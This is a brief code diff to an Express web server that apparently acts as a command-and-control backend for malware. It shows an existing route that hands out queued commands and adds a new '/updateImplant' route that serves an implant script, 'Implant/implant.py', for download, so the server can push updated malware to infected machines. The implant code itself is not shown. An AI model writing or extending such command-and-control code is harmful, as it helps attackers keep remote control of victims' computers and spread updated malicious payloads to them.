@@ -41,4 +41,8 @@ app.get('/retrcommand', (req, res) => {
     res.send(command)
 });
 
+app.get('/updateImplant', (req, res) => {
+    res.download('Implant/implant.py')
+});
+
 app.listen(port, hostname);
